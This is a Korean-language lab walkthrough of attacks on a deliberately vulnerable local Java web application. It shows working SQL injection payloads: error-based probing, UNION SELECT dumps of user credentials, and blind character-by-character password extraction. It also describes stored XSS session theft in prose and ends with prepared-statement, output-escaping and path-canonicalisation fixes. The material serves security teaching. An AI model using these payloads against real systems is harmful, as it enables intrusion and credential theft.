🔭 Phase 1 — 정찰 (Reconnaissance)

해커가 처음 마주한 것은 http://localhost:8082/nas/main/main.do?extendedParam=sitdId=nas 라는 URL입니다. URL 구조만 봐도 많은 정보가 보입니다. .do 확장자는 Java 기반 레거시 MVC 프레임워크(Spring MVC, Struts)의 전형적인 패턴이고, extendedParam 같은 복합 파라미터는 내부에서 파싱되어 DB 쿼리에 사용될 가능성이 높습니다.

해커는 직접 공격하기 전에 HTTP 응답 헤더를 확인합니다. 헤더에서 Set-Cookie: JSESSIONID=...와 서버 정보를 수집하면, 공격 대상의 기술 스택과 방어 수준을 빠르게 파악할 수 있습니다.

① JSESSIONID 노출

② .do URL 구조
Struts 또는 Spring MVC 레거시 패턴. 입력 파라미터가 Handler → Service → DAO 계층으로 전달되며, 각 계층에서 SQL 인젝션 가능성 존재.
③ extendedParam 복합 파라미터
sitdId=nas 형태로 내부 파싱됨. 파싱 로직에 따라 SQL 쿼리 조건절로 직접 사용될 가능성 높음. 분리 파싱 취약점(Parameter Pollution) 의심.
④ Content-Language: en-KR
한국어 기반 시스템. 공공기관/금융권 레거시 시스템 패턴. 보안 패치 주기가 긴 경우가 많으며, 구버전 프레임워크 사용 가능성 높음.

💉 Phase 2-A — Error-based → UNION SELECT 전체 DB 덤프

해커는 가장 먼저 단순하지만 확실한 방법으로 취약점 존재를 확인합니다 — 단일 따옴표(') 삽입. SQL 쿼리 내에서 문자열이 닫히면 문법 오류가 발생하고, 그 오류 메시지가 화면에 노출된다면 Error-based SQLi가 가능하다는 확실한 증거가 됩니다.

오류 메시지에서 DB 엔진(H2), 쿼리 구조, 테이블명까지 노출됩니다. 이것만으로도 해커는 내부 DB 구조를 상당 부분 파악하고 이후 공격을 정밀하게 설계할 수 있습니다.

Step 2A-1 · 단일 따옴표 삽입 — 취약점 존재 확인
CRITICAL성공
1
단일 따옴표 삽입 — 구문 오류 유발
가장 기본적인 SQLi 탐지. keyword 파라미터에 따옴표를 삽입하면 백엔드 SQL 쿼리의 문자열이 비정상적으로 닫히면서 문법 오류가 발생합니다.
GET /nas/search/search.do?keyword='&extendedParam=sitdId=nas HTTP/1.1
2
서버가 내부 SQL 쿼리와 DB 오류를 그대로 응답
취약한 서버는 예외를 처리하지 않고 오류를 HTML에 직접 출력합니다. 해커는 이를 통해 완전한 쿼리 구조와 DB 엔진을 파악합니다.
⚠️ 실행된 쿼리: SELECT id, title, content, author, category FROM documents WHERE title LIKE '%''%'' ⚠️ DB 오류: StatementCallback; bad SQL grammar [...WHERE title LIKE '%'%[*]'"]; nested exception is org.h2.jdbc.JdbcSQLSyntaxErrorException: Syntax error in SQL statement "...LIKE '%'%[*]'"; [42000-214]
해커가 획득한 정보: DB 엔진 = H2, 테이블명 = documents, 컬럼 = id/title/content/author/category (5개), 쿼리 패턴 = LIKE '%keyword%'
Step 2A-2 · UNION SELECT — 컬럼 수 확인 및 데이터 추출
CRITICAL성공

Error-based로 컬럼이 5개임을 파악했습니다 (id, title, content, author, category). 이제 UNION SELECT로 두 번째 결과셋을 삽입합니다. 원본 쿼리가 결과를 반환하지 않도록 notexist로 AND 조건을 거짓으로 만들고, UNION으로 원하는 데이터를 주입합니다.

1
컬럼 수 맞추기 — null 값으로 탐색
# 5컬럼 확인 (오류 없이 성공) keyword=notexist' UNION SELECT 1,2,3,4,5-- - # 결과: <td>1</td><td>2</td><td>3</td>... (각 컬럼 위치 확인)
2
information_schema로 DB 구조 열거
H2의 INFORMATION_SCHEMA에서 전체 테이블 목록을 추출합니다.
keyword=notexist' UNION ALL SELECT TABLE_NAME, TABLE_TYPE, 'schema', 'cat', CAST(ID AS VARCHAR) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'-- -
발견된 테이블: USERS | BOARD | DOCUMENTS
3
핵심 페이로드 — users 테이블 자격증명 전체 덤프
UNION ALL로 원본 결과와 함께 사용자 데이터를 삽입합니다. ||로 컬럼을 연결해 단일 셀에 여러 정보를 표시하는 테크닉을 사용합니다.
keyword=notexist' UNION ALL SELECT id, title, content, author, category FROM documents WHERE 1=1 UNION ALL SELECT 1, 'USERS_TABLE', username || ':' || password, role, email FROM users-- -
실제 서버 응답 — 탈취된 자격증명

결과: 단 1회의 HTTP 요청으로 전체 사용자 테이블(4개 계정)이 평문 비밀번호와 함께 탈취되었습니다. 비밀번호가 해싱조차 되지 않아 즉시 로그인에 사용 가능합니다.
🔢 Phase 2-B — 숫자형 파라미터 SQLi

docId=1처럼 숫자형 파라미터는 많은 개발자들이 "숫자니까 안전하다"고 오해합니다. 하지만 서버에서 String docId = request.getParameter("docId")로 받아 쿼리에 직접 삽입하면 따옴표 없이도 SQLi가 가능합니다.

더 나아가 숫자형 파라미터는 addslashes()나 따옴표 이스케이프를 적용하지 않는 경우가 많아 Medium 레벨 방어도 쉽게 우회됩니다. 해커는 이를 이용해 관리자 계정만 선택적으로 추출합니다.

🕶️ Phase 2-C — Blind SQL Injection: 비밀번호 문자별 자동 추출

/user/userInfo.do는 결과가 화면에 직접 표시되지 않습니다 — "사용자가 존재합니다" 또는 "사용자가 존재하지 않습니다"라는 두 가지 응답만 돌아옵니다. 이것이 바로 Blind SQL Injection의 환경입니다.

해커는 SQL의 SUBSTRING() 함수와 문자 비교를 이용해 비밀번호를 한 글자씩 추출합니다. AND SUBSTRING(password,1,1)='a'가 참이면 "존재합니다", 거짓이면 "없습니다"가 응답되고, 알파벳/숫자를 순서대로 대입하면 비밀번호 전체를 복원할 수 있습니다.

Step 2C-1 · True / False 응답 차이 확인
HIGH성공
TRUE 조건 (항상 참인 조건 삽입)
GET /nas/user/userInfo.do?userId=admin' AND '1'='1 # 실행: WHERE username = 'admin' AND '1'='1' # → 조건 참 → 사용자 존재
✅ 사용자가 존재합니다 (EXISTS)
FALSE 조건 (항상 거짓인 조건 삽입)
GET /nas/user/userInfo.do?userId=admin' AND '1'='2 # 실행: WHERE username = 'admin' AND '1'='2' # → 조건 거짓 → 사용자 없음
❌ 사용자가 존재하지 않습니다 (MISSING)
핵심: 두 응답의 차이가 확인되었습니다. 이제 이 차이를 이용해 임의의 조건의 참/거짓을 판별할 수 있습니다.
Step 2C-2 · SUBSTRING 비밀번호 문자별 추출 (자동화)
HIGH성공 — admin1234 추출
추출 원리
# 비밀번호의 N번째 문자가 'X'인지 확인하는 쿼리 userId=admin' AND SUBSTRING(password,N,1)='X' # 내부 실행 쿼리: SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password, N, 1) = 'X' # COUNT=1이면 "존재합니다" → 해당 위치 문자 = X
실제 추출 과정 (순차 대입 방식)
위치 1: 'a' AND SUBSTRING(password,1,1)='a' → ✅ 존재합니다 → 문자: 'a' 위치 2: 'd' AND SUBSTRING(password,2,1)='d' → ✅ 존재합니다 → 문자: 'd' 위치 3: 'm' AND SUBSTRING(password,3,1)='m' → ✅ 존재합니다 → 문자: 'm' 위치 4: 'i' AND SUBSTRING(password,4,1)='i' → ✅ 존재합니다 → 문자: 'i' 위치 5: 'n' AND SUBSTRING(password,5,1)='n' → ✅ 존재합니다 → 문자: 'n' 위치 6: '1' AND SUBSTRING(password,6,1)='1' → ✅ 존재합니다 → 문자: '1' 위치 7: '2' AND SUBSTRING(password,7,1)='2' → ✅ 존재합니다 → 문자: '2' 위치 8: '3' AND SUBSTRING(password,8,1)='3' → ✅ 존재합니다 → 문자: '3' 위치 9: '4' AND SUBSTRING(password,9,1)='4' → ✅ 존재합니다 → 문자: '4' 위치 10: (이후 문자 없음) → 추출된 비밀번호: admin1234
이진 탐색으로 최적화 (AI 생성 — 요청 수 최소화)
# 순차 대입: 최악 36회/문자 × 9문자 = 324회 요청 # 이진 탐색 최적화: 최대 6회/문자 × 9문자 = 54회 요청 # 이진 탐색 예시 (ASCII 범위 32~126) userId=admin' AND ORD(SUBSTRING(password,1,1)) > 79-- # 중간값 # TRUE → 80~126 범위, FALSE → 32~79 범위 # 반복 → log2(95) ≈ 7회로 1문자 확정
🎭 Phase 3 — XSS: 세션 탈취 → 영속적 피해 삽입

SQLi로 자격증명을 탈취했지만, 해커는 여기서 멈추지 않습니다. 피해자가 비밀번호를 변경하면 탈취한 자격증명은 무효가 됩니다. 그래서 해커는 지속적인 접근을 위한 Stored XSS를 삽입합니다.

Stored XSS는 게시판에 한 번 삽입해 두면 이후 해당 페이지에 접속하는 모든 사용자의 브라우저에서 자동 실행됩니다. JSESSIONID를 실시간으로 공격자 서버로 전송하도록 설정하면, 관리자가 로그인할 때마다 세션을 탈취할 수 있습니다.

Step 3-1 · Reflected XSS — 관리자 대상 피싱 링크
HIGH성공

📂 Phase 4 — Path Traversal: 서버 파일 시스템 탐색

🔧 취약점 근본 원인 및 대응 방안
✅ SQL Injection → Prepared Statement
취약 코드
// ★ 취약 — 문자열 직접 연결 String q = "SELECT * FROM documents WHERE title LIKE '%" + keyword + "%'";
안전 코드
// ✅ 안전 — Prepared Statement String q = "SELECT * FROM documents WHERE title LIKE ?"; jdbc.queryForList(q, "%" + keyword + "%");
✅ XSS → htmlEscape + c:out
취약 코드
<!-- JSP — 직접 출력 --> 공지: <%= request.getAttribute("msg") %> <td>${post.CONTENT}</td>
안전 코드
<!-- JSTL c:out — 자동 HTML 이스케이프 --> 공지: <c:out value="${msg}"/> <td><c:out value="${post.CONTENT}"/></td>
✅ Path Traversal → 경로 정규화 + 기준 디렉토리 검증
취약 코드
// ★ 취약 — 경로 검증 없음 File file = new File(UPLOAD_DIR + fileName);
안전 코드
// ✅ 안전 — canonical path 검증 File base = new File(UPLOAD_DIR).getCanonicalFile(); File file = new File(UPLOAD_DIR + fileName).getCanonicalFile(); if (!file.toPath().startsWith(base.toPath())) { throw new SecurityException("Path traversal 감지"); }
✅ 설정 파일 보안 강화

취약점 → 원인 → 해결 원칙 요약
취약점근본 원인올바른 해결잘못된 해결 (우회됨)

Path Traversal 파일 경로 정규화 없음 canonicalPath + startsWith 검증 ../ 문자열 제거 → URL 인코딩(%2e%2e%2f) 우회
설정 파일 노출 H2 콘솔 활성화, 평문 설정 콘솔 비활성화 + 환경변수 분리 접근 제어 IP 제한 → SSRF로 우회

핵심 교훈: 블랙리스트 방식(위험 문자 차단)은 항상 우회 방법이 존재합니다. 화이트리스트 방식과 파라미터 바인딩이 유일한 근본 해결책입니다. 보안은 여러 계층에서 동시에 적용되어야 하며(Defense in Depth), 한 계층이 뚫려도 다음 계층이 피해를 최소화합니다.
